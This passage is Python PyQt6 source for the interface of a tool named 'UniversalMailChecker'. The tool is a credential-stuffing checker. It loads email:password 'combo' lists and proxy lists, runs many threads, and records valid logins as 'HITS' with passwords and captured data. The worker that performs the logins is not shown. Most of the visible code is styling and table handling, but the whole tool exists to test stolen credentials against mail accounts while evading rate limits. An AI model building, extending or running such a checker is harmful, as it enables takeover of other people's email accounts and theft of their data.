                background: rgba(26, 26, 26, 0.5);
            }
            QTabBar::tab {
                background: rgba(64, 64, 64, 0.3);
                color: #737373;
                padding: 12px 25px;
                margin-right: 5px;
                border-top-left-radius: 8px;
                border-top-right-radius: 8px;
                font-weight: 600;
                font-size: 10pt;
            }
            QTabBar::tab:selected {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                    stop:0 #525252, stop:1 #404040);
                color: #d4d4d4;
            }
            QTabBar::tab:hover {
                background: rgba(82, 82, 82, 0.4);
                color: #a3a3a3;
            }
        """)

        self.results_table_hits = self.create_results_table(["Email", "Password", "Status", "Protocol", "Capture/Result"])
        self.results_table_invalids = self.create_results_table(["Combo", "Reason"])
        self.results_table_errors = self.create_results_table(["Combo", "Error"])
        
        self.log_box = QTextEdit()
        self.log_box.setReadOnly(True)
        self.log_box.document().setMaximumBlockCount(200)
        self.log_box.setStyleSheet("""
            QTextEdit {
                background: rgba(26, 26, 26, 0.3);
                color: #d4d4d4;
                border: none;
                border-radius: 8px;
                padding: 15px;
                font-family: 'Consolas', 'Courier New', monospace;
                font-size: 10pt;
            }
        """)

        self.tabs.addTab(self.results_table_hits, "HITS (0)")
        self.tabs.addTab(self.results_table_invalids, "INVALIDS (0)")
        self.tabs.addTab(self.results_table_errors, "ERRORS (0)")
        self.tabs.addTab(self.log_box, "LOG")
        
        self.main_layout.addWidget(self.tabs)
        
        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)
        self.status_label = QLabel("Ready")
        self.status_label.setFont(QFont("Segoe UI", 10, QFont.Weight.Bold))
        self.status_label.setStyleSheet("color: #a3a3a3;")
        self.status_bar.addWidget(self.status_label, 1)

    def create_button(self, text, color1, color2):
        """Create a styled button"""
        btn = QPushButton(text)
        btn.setFixedSize(120, 45)
        btn.setFont(QFont("Segoe UI", 10, QFont.Weight.Bold))
        btn.setCursor(Qt.CursorShape.PointingHandCursor)
        btn.setStyleSheet(f"""
            QPushButton {{
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 {color1}, stop:1 {color2});
                color: white;
                border: none;
                border-radius: 8px;
                letter-spacing: 1px;
            }}
            QPushButton:hover {{
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 {color2}, stop:1 #a3a3a3);
            }}
            QPushButton:pressed {{
                background: {color1};
            }}
            QPushButton:disabled {{
                background: rgba(64, 64, 64, 0.3);
                color: rgba(115, 115, 115, 0.5);
            }}
        """)
        return btn

    def create_small_button(self, text):
        """Create a small styled button"""
        btn = QPushButton(text)
        btn.setFixedHeight(32)
        btn.setFont(QFont("Segoe UI", 9, QFont.Weight.Bold))
        btn.setCursor(Qt.CursorShape.PointingHandCursor)
        btn.setStyleSheet("""
            QPushButton {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 rgba(82, 82, 82, 0.4), stop:1 rgba(115, 115, 115, 0.4));
                color: #d4d4d4;
                border: 2px solid rgba(115, 115, 115, 0.4);
                border-radius: 6px;
                padding: 0 18px;
            }
            QPushButton:hover {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 rgba(82, 82, 82, 0.6), stop:1 rgba(115, 115, 115, 0.6));
                border: 2px solid rgba(163, 163, 163, 0.6);
            }
        """)
        return btn

    def create_stat_card(self, label_text, value, color):
        """Create a statistics card widget"""
        widget = QFrame()
        widget.setStyleSheet(f"""
            QFrame {{
                background: rgba(64, 64, 64, 0.2);
                border-left: 4px solid {color};
                border-radius: 10px;
                padding: 12px;
            }}
        """)
        
        layout = QVBoxLayout(widget)
        layout.setSpacing(5)
        
        label = QLabel(label_text)
        label.setFont(QFont("Segoe UI", 9, QFont.Weight.Bold))
        label.setStyleSheet(f"color: {color}; border: none; letter-spacing: 1px;")
        
        value_label = QLabel(value)
        value_label.setFont(QFont("Segoe UI", 20, QFont.Weight.Bold))
        value_label.setStyleSheet(f"color: {color}; border: none;")
        value_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        value_label.setWordWrap(False)
        
        layout.addWidget(label)
        layout.addWidget(value_label)
        
        widget.value_label = value_label
        
        return widget

    def create_results_table(self, headers):
        """Create a styled results table"""
        table = QTableWidget()
        table.setColumnCount(len(headers))
        table.setHorizontalHeaderLabels(headers)
        table.horizontalHeader().setSectionResizeMode(0, QHeaderView.ResizeMode.Stretch)
        if len(headers) > 1:
            for i in range(1, len(headers)):
                table.horizontalHeader().setSectionResizeMode(i, QHeaderView.ResizeMode.ResizeToContents)
        table.verticalHeader().setVisible(False)
        table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
        table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        table.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        table.customContextMenuRequested.connect(lambda pos, t=table: self.show_table_context_menu(t, pos))
        table.setAlternatingRowColors(True)
        table.setStyleSheet("""
            QTableWidget {
                background: rgba(26, 26, 26, 0.3);
                color: #d4d4d4;
                gridline-color: rgba(115, 115, 115, 0.1);
                border: none;
                font-size: 10pt;
            }
            QTableWidget::item {
                padding: 12px;
                border-bottom: 1px solid rgba(115, 115, 115, 0.1);
            }
            QTableWidget::item:selected {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 rgba(82, 82, 82, 0.5), stop:1 rgba(115, 115, 115, 0.5));
                color: white;
            }
            QTableWidget::item:alternate {
                background: rgba(64, 64, 64, 0.1);
            }
            QHeaderView::section {
                background: rgba(82, 82, 82, 0.3);
                color: #a3a3a3;
                padding: 12px;
                border: none;
                font-weight: bold;
                font-size: 10pt;
            }
        """)
        return table

    def init_actions(self):
        """Initialize button actions"""
        self.btn_start.clicked.connect(self.start_checking)
        self.btn_pause.clicked.connect(self.pause_checking)
        self.btn_stop.clicked.connect(self.stop_checking)

    def apply_theme(self):
        """Apply Fusion dark theme"""
        self.setStyleSheet("""
            QMainWindow {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:1,
                    stop:0 #0f0f0f, stop:0.5 #1a1a1a, stop:1 #0f0f0f);
            }
            QWidget {
                color: #d4d4d4;
                font-family: 'Segoe UI', Arial, sans-serif;
            }
            QMenuBar {
                background: rgba(26, 26, 26, 0.8);
                color: #d4d4d4;
                border-bottom: 2px solid rgba(115, 115, 115, 0.3);
                padding: 8px;
            }
            QMenuBar::item {
                background: transparent;
                padding: 8px 15px;
                border-radius: 6px;
            }
            QMenuBar::item:selected {
                background: rgba(115, 115, 115, 0.3);
            }
            QMenu {
                background: rgba(26, 26, 26, 0.95);
                color: #d4d4d4;
                border: 2px solid rgba(115, 115, 115, 0.3);
                border-radius: 8px;
            }
            QMenu::item {
                padding: 10px 25px;
                border-radius: 5px;
            }
            QMenu::item:selected {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 #525252, stop:1 #737373);
            }
            QStatusBar {
                background: rgba(26, 26, 26, 0.8);
                color: #737373;
                border-top: 2px solid rgba(115, 115, 115, 0.3);
            }
        """)

    def open_settings(self):
        """Open settings dialog"""
        dialog = SettingsDialog(self.settings, self)
        dialog.exec()

    def get_current_settings(self):
        """Get current settings as dictionary"""
        return {
            "threads": self.settings.value("threads", 200, type=int),
            "timeout": self.settings.value("timeout", 10, type=int),
            "delimiter": self.settings.value("delimiter", ":"),
            "smart_search": self.settings.value("smart_search", False, type=bool),
            "use_proxies": self.settings.value("use_proxies", False, type=bool),
            "proxy_type": self.settings.value("proxy_type", "HTTP/HTTPS"),
            "proxy_username": self.settings.value("proxy_username", ""),
            "proxy_password": self.settings.value("proxy_password", "")
        }

    def load_combos(self):
        """Load combo list file"""
        file_path, _ = QFileDialog.getOpenFileName(self, "Open Combo List", "", "Text Files (*.txt);;All Files (*)")
        if file_path:
            try:
                self.combos_loaded = sum(1 for _ in open(file_path, 'r', encoding='utf-8', errors='ignore'))
                self.combos_file_path = file_path
                self.combos_info.setText(f"Combos: {self.combos_loaded:,}")
                self.progress_bar.setMaximum(self.combos_loaded)
                self.update_status(f"Loaded {self.combos_loaded:,} combos", "#a3a3a3")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to load combo file: {e}")

    def load_proxies(self):
        """Load proxy list file"""
        file_path, _ = QFileDialog.getOpenFileName(self, "Open Proxy List", "", "Text Files (*.txt);;All Files (*)")
        if file_path:
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    self.proxies = [line.strip() for line in f if line.strip()]
                self.proxies_loaded = len(self.proxies)
                self.proxies_info.setText(f"Proxies: {self.proxies_loaded:,}")
                self.update_status(f"Loaded {self.proxies_loaded:,} proxies", "#a3a3a3")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to load proxy file: {e}")

    def open_results_folder(self):
        """Open results folder in file explorer"""
        import subprocess
        import platform
        
        folder = self.current_session_folder if self.current_session_folder and os.path.exists(self.current_session_folder) else "Results"
        
        if not os.path.exists(folder):
            QMessageBox.warning(self, "Error", "No results folder found!")
            return
        
        try:
            if platform.system() == 'Windows':
                os.startfile(folder)
            elif platform.system() == 'Darwin':
                subprocess.call(['open', folder])
            else:
                subprocess.call(['xdg-open', folder])
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Could not open folder: {e}")

    def start_checking(self):
        if not hasattr(self, 'combos_file_path') or not self.combos_file_path:
            QMessageBox.warning(self, "Warning", "Please load a combo list first.")
            return

        self.is_running = True
        self.is_paused = False
        self.reset_ui()

        self.worker = MailCheckerWorker(self.get_current_settings())
        
        self.current_session_folder = self.worker.session_folder
        
        self.worker.combo_file_path = self.combos_file_path
        
        if hasattr(self, 'proxies'):
            self.worker.proxies = self.proxies

        self.worker_thread = QThread()
        self.worker.moveToThread(self.worker_thread)

        self.worker.signals.progress.connect(self.set_last_gui_stats)
        self.worker.signals.log.connect(self.add_log_message)
        self.worker.signals.finished.connect(self.on_checking_finished)
        self.worker.signals.cpm.connect(self.update_cpm)
        self.worker.signals.add_hit.connect(self.add_hit_to_table)
        self.worker.signals.add_invalid.connect(self.add_invalid_to_table)
        self.worker.signals.add_error.connect(self.add_error_to_table)

        self.worker_thread.started.connect(self.worker.run)
        self.worker_thread.start()

        self.toggle_controls(True)
        
        session_name = os.path.basename(self.current_session_folder)
        self.update_status(f"Running... {session_name}", "#4ade80")

    def add_hit_to_table(self, combo, protocol, capture):
        self._hit_batch.append((combo, protocol, capture))
        
        if len(self._hit_batch) >= 2 or self.results_table_hits.rowCount() == 0:
            self.results_table_hits.setUpdatesEnabled(False)
            
            for combo_str, prot_str, capt_str in self._hit_batch:
                if self.results_table_hits.rowCount() >= self.max_table_rows:
                    self.results_table_hits.removeRow(0)
                
                row = self.results_table_hits.rowCount()
                self.results_table_hits.insertRow(row)
                
                # Parse combo
                parts = combo_str.split(':')
                email = parts[0] if len(parts) > 0 else combo_str
                password = parts[1] if len(parts) > 1 else ''
                
                item1 = QTableWidgetItem(email)
                item2 = QTableWidgetItem(password)
                item3 = QTableWidgetItem("Live")
                item4 = QTableWidgetItem(prot_str)
                item5 = QTableWidgetItem(capt_str)
                
                for item in [item1, item2, item3, item4, item5]:
                    item.setForeground(QBrush(QColor("#4ade80")))
                
                self.results_table_hits.setItem(row, 0, item1)
                self.results_table_hits.setItem(row, 1, item2)
                self.results_table_hits.setItem(row, 2, item3)
                self.results_table_hits.setItem(row, 3, item4)
                self.results_table_hits.setItem(row, 4, item5)
            
            self.results_table_hits.setUpdatesEnabled(True)
            self._hit_batch.clear()

    def add_invalid_to_table(self, combo, reason):
        self._invalid_batch.append((combo, reason))
        
        if len(self._invalid_batch) >= 5:
            self.results_table_invalids.setUpdatesEnabled(False)
            
            for combo_str, reason_str in self._invalid_batch:
                if self.results_table_invalids.rowCount() >= self.max_table_rows:
                    self.results_table_invalids.removeRow(0)
                
                row = self.results_table_invalids.rowCount()
                self.results_table_invalids.insertRow(row)
                self.results_table_invalids.setItem(row, 0, QTableWidgetItem(combo_str))
                self.results_table_invalids.setItem(row, 1, QTableWidgetItem(reason_str))
            
            self.results_table_invalids.setUpdatesEnabled(True)
            self._invalid_batch.clear()

    def add_error_to_table(self, combo, error):
        self._error_batch.append((combo, error))
        
        if len(self._error_batch) >= 10:
            self.results_table_errors.setUpdatesEnabled(False)
            
            for combo_str, error_str in self._error_batch:
                if self.results_table_errors.rowCount() >= self.max_table_rows:
                    self.results_table_errors.removeRow(0)
                
                row = self.results_table_errors.rowCount()
                self.results_table_errors.insertRow(row)
                self.results_table_errors.setItem(row, 0, QTableWidgetItem(combo_str))
                self.results_table_errors.setItem(row, 1, QTableWidgetItem(error_str))
            
            self.results_table_errors.setUpdatesEnabled(True)
            self._error_batch.clear()

    def pause_checking(self):
        if not self.is_running: 
            return
        self.is_paused = not self.is_paused
        self.worker.toggle_pause()
        self.btn_pause.setText("RESUME" if self.is_paused else "PAUSE")
        self.update_status("Paused" if self.is_paused else "Running...", "#a3a3a3")

    def stop_checking(self):
        if not self.is_running: 
            return
        
        # Flush any remaining batches
        if self._hit_batch:
            self.results_table_hits.setUpdatesEnabled(False)
            for combo, protocol, capture in self._hit_batch:
                if self.results_table_hits.rowCount() >= self.max_table_rows:
                    self.results_table_hits.removeRow(0)
                row = self.results_table_hits.rowCount()
                self.results_table_hits.insertRow(row)
                parts = combo.split(':')
                email = parts[0] if len(parts) > 0 else combo
                password = parts[1] if len(parts) > 1 else ''
                item1 = QTableWidgetItem(email)
                item2 = QTableWidgetItem(password)
                item3 = QTableWidgetItem("Live")
                item4 = QTableWidgetItem(protocol)
                item5 = QTableWidgetItem(capture)
                for item in [item1, item2, item3, item4, item5]:
                    item.setForeground(QBrush(QColor("#4ade80")))
                self.results_table_hits.setItem(row, 0, item1)
                self.results_table_hits.setItem(row, 1, item2)
                self.results_table_hits.setItem(row, 2, item3)
                self.results_table_hits.setItem(row, 3, item4)
                self.results_table_hits.setItem(row, 4, item5)
            self.results_table_hits.setUpdatesEnabled(True)
            self._hit_batch.clear()
        
        if self._invalid_batch:
            self.results_table_invalids.setUpdatesEnabled(False)
            for combo, reason in self._invalid_batch:
                if self.results_table_invalids.rowCount() >= self.max_table_rows:
                    self.results_table_invalids.removeRow(0)
                row = self.results_table_invalids.rowCount()
                self.results_table_invalids.insertRow(row)
                self.results_table_invalids.setItem(row, 0, QTableWidgetItem(combo))
                self.results_table_invalids.setItem(row, 1, QTableWidgetItem(reason))
            self.results_table_invalids.setUpdatesEnabled(True)
            self._invalid_batch.clear()
        
        if self._error_batch:
            self.results_table_errors.setUpdatesEnabled(False)
            for combo, error in self._error_batch:
                if self.results_table_errors.rowCount() >= self.max_table_rows:
                    self.results_table_errors.removeRow(0)
                row = self.results_table_errors.rowCount()
                self.results_table_errors.insertRow(row)
                self.results_table_errors.setItem(row, 0, QTableWidgetItem(combo))
                self.results_table_errors.setItem(row, 1, QTableWidgetItem(error))
            self.results_table_errors.setUpdatesEnabled(True)
            self._error_batch.clear()
        
        self.worker.stop()
        
        self.btn_stop.setEnabled(False)
        self.update_status("Stopping...", "#ff6b6b")
        
        QApplication.processEvents()
        
        if self.worker_thread and self.worker_thread.isRunning():
            self.worker_thread.quit()
            if not self.worker_thread.wait(3000):
                self.worker_thread.terminate()
                self.worker_thread.wait()
        
        self.is_running = False
        self.is_paused = False
        self.toggle_controls(False)
        self.update_status("Stopped", "#525252")

    def on_checking_finished(self, final_stats, elapsed_time, final_cpm):
        self.is_running = False
        self.is_paused = False
        self.toggle_controls(False)
        self.update_status("Finished", "#a3a3a3")
        if self.worker_thread:
            self.worker_thread.quit()
            self.worker_thread.wait()
        
        self.worker = None
        self.worker_thread = None
        
        gc.collect()
        
        elapsed_str = str(timedelta(seconds=int(elapsed_time)))
        
        msg = f'''Verification Complete

Checked: {final_stats['checked']:,}
Hits: {final_stats['hits']:,}
Invalids: {final_stats['invalids']:,}
Errors: {final_stats['errors']:,}
Intelligence Hits: {final_stats.get('intelligence_hits', 0):,}

Time: {elapsed_str}
Average CPM: {final_cpm:,}

Results saved to:
{self.current_session_folder}'''
        
        QMessageBox.information(self, "Complete", msg)

    def update_status(self, message, color):
        self.status_label.setText(f"{message}")
        self.status_label.setStyleSheet(f"color: {color}; font-weight: bold;")

    def update_cpm(self, cpm_val):
        self.cpm = cpm_val
        self.stat_widgets['cpm'].value_label.setText(f"{cpm_val:,}")

    def toggle_controls(self, running):
        self.btn_start.setEnabled(not running)
        self.btn_pause.setEnabled(running)
        self.btn_stop.setEnabled(running)

    def reset_ui(self):
        tables = [self.results_table_hits, self.results_table_invalids, 
                  self.results_table_errors]
        for table in tables:
            table.setRowCount(0)
        self.log_box.clear()
        self.progress_bar.setValue(0)
        
        self.stat_widgets['checked'].value_label.setText("0")
        self.stat_widgets['hits'].value_label.setText("0")
        self.stat_widgets['invalids'].value_label.setText("0")
        self.stat_widgets['errors'].value_label.setText("0")
        self.stat_widgets['cpm'].value_label.setText("0")
        
        self.tabs.setTabText(0, "HITS (0)")
        self.tabs.setTabText(1, "INVALIDS (0)")
        self.tabs.setTabText(2, "ERRORS (0)")
        
        self._hit_batch = []
        self._invalid_batch = []
        self._error_batch = []

    def set_last_gui_stats(self, checked, hits, invalids, errors, intelligence):
        self.last_gui_stats = (checked, hits, invalids, errors, intelligence)
        self.tabs.setTabText(0, f"HITS ({hits:,})")
        self.tabs.setTabText(1, f"INVALIDS ({invalids:,})")
        self.tabs.setTabText(2, f"ERRORS ({errors:,})")
        # Tab 3 is LOG, Tab 4 will be INTELLIGENCE if we add it

    def timer_update_progress(self):
        checked, hits, invalids, errors, intelligence = self.last_gui_stats
        if self.combos_loaded > 0:
            self.progress_bar.setValue(checked)
        
        self.stat_widgets['checked'].value_label.setText(f"{checked:,}")
        self.stat_widgets['hits'].value_label.setText(f"{hits:,}")
        self.stat_widgets['invalids'].value_label.setText(f"{invalids:,}")
        self.stat_widgets['errors'].value_label.setText(f"{errors:,}")

    def add_log_message(self, message, color):
        self.log_box.moveCursor(QTextCursor.MoveOperation.End)
        self.log_box.setTextColor(color)
        self.log_box.insertPlainText(f"[{time.strftime('%H:%M:%S')}] {message}\n")
        self.log_box.moveCursor(QTextCursor.MoveOperation.End)

    def show_table_context_menu(self, table, position):
        menu = QMenu()
        menu.setStyleSheet('''
            QMenu {
                background: rgba(26, 26, 26, 0.95);
                color: #d4d4d4;
                border: 2px solid rgba(115, 115, 115, 0.3);
                border-radius: 8px;
            }
            QMenu::item {
                padding: 10px 25px;
                border-radius: 5px;
            }
            QMenu::item:selected {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 #525252, stop:1 #737373);
            }
        ''')
        copy_action = menu.addAction("Copy Selected")
        export_action = menu.addAction("Export to CSV...")
        
        action = menu.exec(table.mapToGlobal(position))
        if action == copy_action:
            self.copy_table_selection(table)
        elif action == export_action:
            self.export_table(table)

    def copy_table_selection(self, table):
        selection = table.selectionModel().selectedRows()
        if not selection: 
            return

        clipboard_text = ""
        for index in sorted(selection):
            row_text = [table.item(index.row(), col).text() for col in range(table.columnCount())]
            clipboard_text += "\t".join(row_text) + "\n"

        QApplication.clipboard().setText(clipboard_text)

    def export_table(self, table):
        if table.rowCount() == 0:
            QMessageBox.information(self, "Export", "No data to export!")
            return
        
        file_path, _ = QFileDialog.getSaveFileName(self, "Save CSV", "", "CSV Files (*.csv)")
        if file_path:
            try:
                with open(file_path, 'w', encoding='utf-8') as f:
                    headers = [table.horizontalHeaderItem(i).text() for i in range(table.columnCount())]
                    f.write(','.join(headers) + '\n')
                    for row in range(table.rowCount()):
                        data = [table.item(row, col).text().replace(',', ';') for col in range(table.columnCount())]
                        f.write(','.join(data) + '\n')
                self.update_status("Exported successfully!", "lime")
                QMessageBox.information(self, "Export", f"Data exported to:\n{file_path}")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Export failed: {e}")

    def closeEvent(self, event):
        if self.is_running:
            reply = QMessageBox.question(self, "Exit", 
                                         "Checker is running. Exit anyway?",
                                         QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
                                         QMessageBox.StandardButton.No)
            if reply == QMessageBox.StandardButton.Yes:
                self.worker.stop()
                if self.worker_thread and self.worker_thread.isRunning():
                    self.worker_thread.quit()
                    if not self.worker_thread.wait(2000):
                        self.worker_thread.terminate()
                        self.worker_thread.wait()
                event.accept()
            else:
                event.ignore()
        else:
            event.accept()


def global_exception_hook(exctype, value, traceback):
    sys.__excepthook__(exctype, value, traceback)
    logging.critical("Unhandled exception:", exc_info=(exctype, value, traceback))


if __name__ == '__main__':
    sys.excepthook = global_exception_hook
    app = QApplication(sys.argv)
    app.setApplicationName("UniversalMailChecker")
    app.setOrganizationName("MOATTYA")
    app.setStyle("Fusion")
    
    main_win = MainWindow()
    main_win.show()
    sys.exit(app.exec())
